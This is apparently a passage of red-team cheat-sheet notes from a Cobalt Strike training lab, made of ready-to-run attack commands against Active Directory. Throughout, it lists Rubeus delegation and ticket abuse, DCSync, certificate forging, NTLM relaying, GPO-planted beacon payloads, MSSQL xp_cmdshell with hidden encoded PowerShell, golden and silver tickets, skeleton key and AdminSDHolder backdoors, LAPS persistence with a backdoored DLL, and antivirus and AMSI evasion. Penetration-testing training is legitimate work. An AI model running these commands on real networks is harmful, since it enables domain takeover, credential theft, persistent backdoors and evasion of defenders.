beacon> make_token DEV\DC-2$ FakePass
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

###### <font style="color:#00b3ff">Search for Constrained Delegation</font> 
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json

- Get the TGT of the principal (user or machine) trusted for delegation:
	beacon> mimikatz sekurlsa::ekeys

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt
```


###### <font style="color:#00b3ff">Alternate Service Name not validate in s4u, exploit it to request a TGS for any service run by DC-2$</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt

beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

###### <font style="color:#00b3ff">S4U2self Abuse</font> 
```
Machines do not get remote local admin access to themselves over CIFS.  What we can do instead is abuse S4U2self to obtain a TGS to itself, as a user we know is a local admin (e.g. a domain admin):

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /user:WKSTN-2$ /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /impersonateuser:nlamb /ticket:doIFLz[...snip...]MuSU8= /nowrap

The S4U2proxy step will fail, which is fine.  Write the S4U2self TGS to a file.

PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi", [System.Convert]::FromBase64String("doIFdD [...snip...] MtMiQ="))

Use Rubeus describe to show information about the ticket:
	C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

Change tickets service value: https://courses.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/32621616-s4u2self-abuse

To use the ticket, simply pass it into your session:
	beacon> getuid
	beacon> make_token DEV\nlamb FakePass
	beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi
	beacon> ls \\wkstn-2.dev.cyberbotic.io\c$
```

###### <font style="color:#00b3ff">SSH with beacon</font> 
```
beacon> ssh 10.10.17.12:22 svc_oracle Passw0rd!
```

###### <font style="color:#00b3ff">Use ccache in CS</font> 
```
beacon> kerberos_ccache_use C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG

Convert ccache to kirbi with Impacket:
	root@kali:~# impacket-ticketConverter krb5cc_1394201122_MerMmG jking.kirbi
```

###### <font style="color:#00b3ff">Find AD CS Certificate Authorities (CA's) in a domain or forest</font> 
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```

###### <font style="color:#00b3ff">Find vulnerable templates</font> 
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```

###### <font style="color:#00b3ff">Request certificate for user nglover</font> 
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover

Convert to pfx:
	root@kali:~# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	cat cert.pfx | base64 -w 0 

Request TGT with the pfx:
	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:nglover /certificate:MIIM5wIBAz[...snip...]dPAgIIAA== /password:password /aes256 /nowrap
```

###### <font style="color:#00b3ff">NTLM Relaying to ADCS HTTP Endpoints</font> 
```
We cannot relay NTLM to the same machine. 
Use PortBender to capture incoming traffic on port 445 and redirect it to port 8445.
Start a reverse port forward to forward traffic hitting port 8445 to the Team Server on port 445.
Start a SOCKS proxy for ntlmrelayx to send traffic back into the network.

	beacon> PortBender redirect 445 8445
	beacon> rportfwd 8445 127.0.0.1 445
	beacon> socks 1080

root@kali:~# proxychains ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

Remote authentication methods to force a connection from WKSTN-3 to SRV-1

	beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.15.254 10.10.17.25
```

###### <font style="color:#00b3ff">Persistence with Certificate</font> 
```
Use Certify to find all the certificates that permit client authentication:
	beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /clientauth

Request a certificate from the template:
	beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User

Request certificate for the computer:
	beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine
```

---
### Group Policy

###### <font style="color:#00b3ff">Show the Security Identifiers (SIDs) of principals that can create new GPOs in the domain</font> 
```
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

###### <font style="color:#00b3ff">Get the principals that can write to the GP-Link attribute on OUs</font> 
```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

###### <font style="color:#00b3ff">Get a list of machines within an OU</font> 
```
beacon> powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
```

###### <font style="color:#00b3ff">Get any GPO in the domain, where a 4-digit RID has WriteProperty, WriteDacl or WriteOwner. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results</font> 
```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

###### <font style="color:#00b3ff">Resolve the ObjectDN</font> 
```
beacon> powershell Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName
```

---
### Pivot Listeners

###### <font style="color:#00b3ff">Check listening port</font> 
```
beacon> run netstat -anp tcp
```

###### <font style="color:#00b3ff">Open a port in the firewall (and remove it)</font> 
```
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444

netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
```

---
### Remote Server Administration Tools (RSAT)

###### <font style="color:#00b3ff">Check if GroupPolicy module is installed</font> 
```
Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

Install it as local admin:
	Install-WindowsFeature –Name GPMC 
```

###### <font style="color:#00b3ff">Create a new GPO and immediately link it to the target OU</font> 
```
beacon> getuid
beacon> powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```

###### <font style="color:#00b3ff">Find writeable shares with PowerView</font> 
```
beacon> powershell Find-DomainShare -CheckShareAccess

	Write into it:
		beacon> cd \\dc-2\software
		beacon> upload C:\Payloads\pivot.exe
		beacon> ls

	Create a new autorun value to execute a Beacon payload on boot:
		beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString

	Apply gpo updates:
		gpupdate /target:computer /force
```

---
### SharpGPOAbuse

###### <font style="color:#00b3ff">Add an Immediate Scheduled Task to the PowerShell Logging GPO</font> 
```
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

---
### Discretionary Access Control Lists

###### <font style="color:#00b3ff">Looks for principals that has ACL over user jadams</font> 
```
beacon> powershell Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl
```

###### <font style="color:#00b3ff">Look for an entire OU</font> 
```
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

###### <font style="color:#00b3ff">Reset a user's password (pretty bad OPSEC)</font> 
```
beacon> getuid
beacon> make_token DEV\jking Purpl3Drag0n
beacon> run net user jadams N3wPassw0rd! /domain
```

###### <font style="color:#00b3ff">Instead of changing the password we can set an SPN on the account, kerberoast it and attempt to crack offline</font> 
```
beacon> powershell Set-DomainObject -Identity jadams -Set @{serviceprincipalname="fake/NOTHING"}
beacon> powershell Get-DomainUser -Identity jadams -Properties ServicePrincipalName
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:jadams /nowrap
beacon> powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName
```

###### <font style="color:#00b3ff">Modify the User Account Control value on the account to disable preauthentication and then ASREProast it</font> 
```
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue
beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:jadams /nowrap
beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue
```

###### <font style="color:#00b3ff">If we have the ACL on a group, we can add and remove members</font> 
```
beacon> run net group "Oracle Admins" bfarmer /add /domain
beacon> run net user bfarmer /domain
```

---
### MS SQL Servers

###### <font style="color:#00b3ff">Searching for SPNs that begin with MSSQL* with PowerUpSQL</font> 
```
beacon> powershell Get-SQLInstanceDomain
```

###### <font style="color:#00b3ff">Once you've gained access to a target user, Get-SQLConnectionTest can be used to test whether or not we can connect to the database</font> 
```
beacon> powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
```

###### <font style="color:#00b3ff">Then use Get-SQLServerInfo to gather more information about the instance</font> 
```
beacon> powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
```

###### <font style="color:#00b3ff">If there are multiple SQL Servers available, you can chain these commands together to automate the data collection</font> 
```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

###### <font style="color:#00b3ff">Query the MSSQL server</font> 
```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"

root@kali:~# proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
```

---
### MS SQL NetNTLM Capture

###### <font style="color:#00b3ff">Use InveighZero to listen to the incoming requests (this should be run as a local admin)</font> 
```
beacon> execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N

	Exec this query on the MSSQL server:
		EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1

	 Use --format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2 with john or -a 0 -m 5600 svc_mssql-netntlmv2 wordlist with hashcat to crack.
```

---
### MS SQL Command Execution

###### <font style="color:#00b3ff">The xp_cmdshell procedure can be used to execute shell commands on the SQL server.  Invoke-SQLOSCmd from PowerUpSQL provides a simple means of using it</font> 
```
beacon> powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

###### <font style="color:#00b3ff">Enumerate the current state of xp_cmdshell</font> 
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

###### <font style="color:#00b3ff">Enable xp_cmdshell</font> 
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

###### <font style="color:#00b3ff">Spawning a Beacon</font> 
```
EXEC xp_cmdshell 'powershell -w hidden -enc <blah>';
```

---
### MS-SQL Lateral Movement

###### <font style="color:#00b3ff">Discover any links that the current instance has</font> 
```
SELECT * FROM master..sysservers;
```

###### <font style="color:#00b3ff">Query this remote instance over the link using OpenQuery (The use of double and single quotes are important when using OpenQuery.)</font> 
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

###### <font style="color:#00b3ff">Query its configuration (e.g. xp_cmdshell))</font> 
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

###### <font style="color:#00b3ff">If xp_cmdshell is disabled, you can't enable it by executing sp_configure via OpenQuery. If RPC Out is enabled on the link (which is not the default configuration), then you can enable xpcmdshell using the following syntax</font> 
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]
```

###### <font style="color:#00b3ff">Manually querying databases to find links can be cumbersome and time-consuming, so you can also use Get-SQLServerLinkCrawl to automatically crawl all available links</font> 
```
beacon> powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"
```

###### <font style="color:#00b3ff">To execute a shell command on sql-1.cyberbotic.io</font> 
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
```

###### <font style="color:#00b3ff">And to execute a shell command on sql01.mydomain.local, we have to embed multiple OpenQuery statements (the single quotes get exponentially more silly the deeper you go)</font> 
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select * from openquery("sql01.mydomain.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```

###### <font style="color:#00b3ff">Impersonation, SweetPotato has a collection of these various techniques which can be executed via Beacon's execute-assembly command</font> 
```
beacon> execute-assembly C:\Tools\SweetPotato\bin\Debug\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAF[...snip...]ApAA=="

beacon> connect localhost 4444
```
---
###### <font style="color:#00b3ff">DCSync Backdoor</font> 
```
- Use dcsync:
	beacon> dcsync dev.cyberbotic.io DEV\krbtgt

- Add-DomainObjectAcl from PowerView can be used to add a new ACL to a domain object. If we have access to a domain admin account, we can grant dcsync rights to any principal in the domain (a user, group or even computer):

	beacon> powershell Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync
```

###### <font style="color:#00b3ff">AdminSDHolder Backdoor</font> 
```
- Change DACL for AdminSDHolder (wait 60min for propagation):

	beacon> powershell Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All

	beacon> run net group "Domain Admins" bfarmer /add /domain
```

###### <font style="color:#00b3ff">Remote Registry Backdoor</font> 
```
- Add-RemoteRegBackdoor can be run locally on a compromised machine, or remotely with credentials:

	beacon> powershell Add-RemoteRegBackdoor -Trustee DEV\bfarmer

	beacon> ls \\srv-2\c$

	beacon> powershell Get-RemoteMachineAccountHash -ComputerName srv-2
```

###### <font style="color:#00b3ff">Skeleton Key (allows any user to login with mimikatz password)</font> 
```
- Install the key:

	beacon> run hostname

	beacon> mimikatz !misc::skeleton

	beacon> make_token DEV\Administrator mimikatz

	beacon> ls \\dc-2\c$
```


###### <font style="color:#00b3ff">Silver Tickets</font> 
```
- Generate ticket:

	mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv-2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi

	/user is the username to impersonate.
	/domain is the current domain name.
	/sid is the current domain SID.
	/target is the target machine.
	/aes256 is the AES256 key for the target machine.
	/ticket is the filename to save the ticket as


-  Use the ticket:

	beacon> make_token DEV\Administrator FakePass
	beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\srv2-cifs.kirbi
	beacon> ls \\srv-2\c$


- Technique and required tickets:
	psexec	CIFS
	winrm	HOST & HTTP
	dcsync (DCs only)	LDAP


- Jump to another host:
	beacon> run klist
	beacon> jump winrm64 srv-2 smb
```


###### <font style="color:#00b3ff">Golden tickets</font> 
```
- Create a golden ticket:

	mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi
```

###### <font style="color:#00b3ff">Forged Certificates (forge a certificate valid for 5 years)</font> 
```
- Once on a CA, SharpDPAPI can extract the private keys:

	beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Debug\SharpDPAPI.exe certificates /machine

- The next step is to build the forged certificate with ForgeCert (after .pfx conversion):
C:\Users\Administrator\Desktop>C:\Tools\ForgeCert\ForgeCert\bin\Debug\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@cyberbotic.io" --NewCertPath fake.pfx --NewCertPassword "password"


- Even though you can specify any SubjectAltName, the user does need to be present in AD.  In this example, the default Administrator account is used.  Then we can simply use Rubeus to request a legitimate TGT with this forged certificate and use it to access the domain controller:

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:Administrator /domain:cyberbotic.io /certificate:MIACAQ[...snip...]IEAAAA /password:password /nowrap

```

---

### Forest & Domain Trusts, Parents & Childs

###### <font style="color:#00b3ff">Get domain trust</font> 
```
beacon> powershell Get-DomainTrust
```

###### <font style="color:#00b3ff">Get the SID of a target group in the parent domain (to create a Golden Ticket with SID history)</font> 
```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name

	mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi

	/user is the username to impersonate.
	/domain is the current domain.
	/sid is the current domain SID.
	/sids is the SID of the target group to add ourselves to.
	/aes256 is the AES256 key of the current domain's krbtgt account.
	/startoffset sets the start time of the ticket to 10 mins before the current time.
	/endin sets the expiry date for the ticket to 60 mins.
	/renewmax sets how long the ticket can be valid for if renewed.
```

###### <font style="color:#00b3ff">Use the Golden Ticket</font> 
```
beacon> make_token CYBER\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cyberbotic.kirbi
beacon> ls \\dc-1\c$
beacon> rev2self
```

#### One-Way (Inbound)

###### <font style="color:#00b3ff">Get domain trust and enumerate foreign domain</font> 
```
beacon> powershell Get-DomainTrust
beacon> powershell Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName

	(SharpHound -c DcOnly -d subsidiary.external will also work.)

- Get-DomainForeignGroupMember will enumerate any groups that contain users outside of its domain and return its members:

	beacon> powershell Get-DomainForeignGroupMember -Domain subsidiary.external
```

###### <font style="color:#00b3ff">Resolve SID</font> 
```
beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
```

###### <font style="color:#00b3ff">Get-NetLocalGroupMember can enumerate the local group membership of a machine</font> 
```
beacon> powershell Get-NetLocalGroupMember -ComputerName ad.subsidiary.external
```

###### <font style="color:#00b3ff">To hop the trust, we need to impersonate a member of this domain group. If you can get clear text credentials, make_token is the most straight forward method</font> 
```
beacon> powershell Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName

beacon> make_token DEV\jadams TrustNo1

beacon> ls \\ad.subsidiary.external\c$

- If you only have the user's RC4/AES keys, we can still request Kerberos tickets with Rubeus but it's more involved. We need an inter-realm key which Rubeus won't produce for us automatically, so we have to do it manually.
```

###### <font style="color:#00b3ff">First, we need a TGT for the principal in question. This TGT will come from the current domain</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
```

###### <font style="color:#00b3ff">Next, request a referral ticket from the current domain, for the target domain</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFdD[...snip...]MuSU8= /nowrap
```

###### <font style="color:#00b3ff">Finally, use this inter-realm TGT to request a TGS in the target domain</font> 
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:cifs/ad.subsidiary.external /domain:ad.subsidiary.external /dc:ad.subsidiary.external /ticket:doIFMT[...snip...]5BTA== /nowrap
```

###### <font style="color:#00b3ff">Write this base64 encoded ticket to a file on your machine</font> 
```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("doIFiD [...snip...] 5hbA=="))
```

###### <font style="color:#00b3ff">Create a sacrificial logon session and import the ticket</font> 
```
beacon> make_token DEV\jadams FakePass
beacon> kerberos_ticket_use C:\Users\abc\Desktop\subsidiary.kirbi
beacon> ls \\ad.subsidiary.external\c$
beacon> rev2self
```

#### One-Way (Outbound)

```
- The strategy is to find principals in cyberbotic.io that are not native to that domain, but are from mydomain.local (outbound trust):
	beacon> powershell Get-DomainForeignGroupMember -Domain cyberbotic.io

- Find machines where the target group has RDP access (two commands work):
	beacon> powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName

	beacon> powershell Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName


- Move laterally to the machine and check network connection:
	beacon> shell netstat -anop tcp | findstr 3389


- Portscan the target domain (that cannot be enumerated):
	beacon> portscan 10.10.18.0/24 139,445,3389,5985 none 1024


- Inject a Beacon into one of jean.wise's processes (user connected in RDP):
	beacon> inject 4960 x64 tcp-local


- If we import a tool, like PowerView and do Get-Domain, we get a result that is actually returned from the mydomain.local domain:
	beacon> powershell Get-Domain


- We didn't see port 445 open, so we can't do anything over file shares, but 5985 is:
	beacon> remote-exec winrm sql01.mydomain.local whoami; hostname
	beacon> jump winrm64 sql01.mydomain.local pivot-sql-1

- List \\tsclient\c the C: drive on the origin machine of the RDP session:
	beacon> ls \\tsclient\c

- What we can do is upload a payload, such as a bat or exe to jean.wise's startup folder. The next time they login, it will execute and we get a shell:
	beacon> cd \\tsclient\c\Users\jean.wise\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
	beacon> upload C:\Payloads\pivot.exe
	beacon> ls

```

#### Local Administrator Password Solution

```
- There are a few methods to hunt for the presence of LAPS. If LAPS is applied to a machine that you have access to, AdmPwd.dll will be on disk:
	beacon> run hostname
	beacon> ls C:\Program Files\LAPS\CSE
	
- Find GPOs that have "LAPS" or some other descriptive term in the name:
	beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

- Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property):
	beacon> powershell Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname

- If we can find the correct GPO, we can download the LAPS configuration from the gpcfilesyspath:
	beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine
	beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol

- Parse-PolFile from the GPRegistryPolicyParser package can be used to convert this file into human-readable format:
	PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

- The native LAPS PowerShell cmdlets can be used if they're installed on a machine we have access to:
	beacon> powershell Get-Command *AdmPwd*

- Find-AdmPwdExtendedRights will list the principals allowed to read the LAPS password for machines in the given OU:
	beacon> run hostname
	beacon> getuid
	beacon> powershell Find-AdmPwdExtendedRights -Identity Workstations | fl

- Since Domain Admins can read all the LAPS password attributes, Get-AdmPwdPassword will do just that:
	beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

- Make a token (or use some other method of impersonation) for a user in the 1st Line Support group:
	beacon> make_token DEV\jking Purpl3Drag0n
	beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl
	beacon> rev2self
	beacon> make_token .\lapsadmin P0OPwa4R64AkbJ
	beacon> ls \\wkstn-2\c$

- If you don't have access to the native LAPS cmdlets, PowerView can find the principals that have ReadPropery on ms-Mcs-AdmPwd. There are also other tools such as the LAPSToolkit:
	beacon> powershell Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier

	beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
	beacon> make_token DEV\jking Purpl3Drag0n
	beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```

###### <font style="color:#00b3ff">LAPS Persistence</font> 
```
- Setting the expiration date of LAPS password into the future:
	beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-mcs-admpwdexpirationtime

- The expiration time is an epoch value that we can increase to any arbitrary value. Because the computer accounts are allowed to update the LAPS password attributes, we need to be SYSTEM on said computer:
	beacon> run hostname
	beacon> getuid
	beacon> powershell Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}

- The PowerShell cmdlets for LAPS can be found in C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS

- Upload backdoor DLL:
	beacon> upload C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll

- Modify the timestamp:
	beacon> timestomp AdmPwd.PS.dll AdmPwd.PS.psd1
```

---

###### <font style="color:#00b3ff">Bypassing AV</font> 
```
- Get-MpThreatDetection is a Windows Defender cmdlet that can also show detected threats:

	beacon> remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources
```

###### <font style="color:#00b3ff">Artifact Kit</font> 
```
- Generate a Windows Service EXE and save it to C:\Payloads, then scan it with ThreatCheck:

C:\>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc.exe

- Searching for where MSSE appears in the kit, we find it's in bypass-pipe.c:
	root@kali:/opt/cobaltstrike/artifact-kit# grep -r MSSE

- To build these changes, run the build.sh script:
	root@kali:/opt/cobaltstrike/artifact-kit# ./build.sh

- Within the dist-pipe directory you'll see a new list of artifacts that have been built, along with an artifact.cna file. The CNA file contains some Aggressor that tells Cobalt Strike to use these artifacts inside of the default ones:
	root@kali:/opt/cobaltstrike/artifact-kit# ls -l dist-pipe/

- Copy (after editing) the whole dist-pipe directory to C:\Tools\cobaltstrike\ArtifactKit:
	C:\Tools\cobaltstrike>pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

###### <font style="color:#00b3ff">Resource Kit</font> 
```
- Scan template.x64.ps1 that is the template used in jump winrm64:

C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
```

###### <font style="color:#00b3ff">AmsiScanBuffer</font> 
```
- The Malleable Command & Control section goes into more depth on specifically what Malleable C2 is and how to customise it. To enable the amsi_disable directive, add the following to your profile:

		post-ex {
				    set amsi_disable "true";
				}
```

###### <font style="color:#00b3ff">Exclude files from AV scan</font> 
```
- Get-MpPreference can be used to list the current exclusions.  This can be done locally, or remotely using remote-exec:
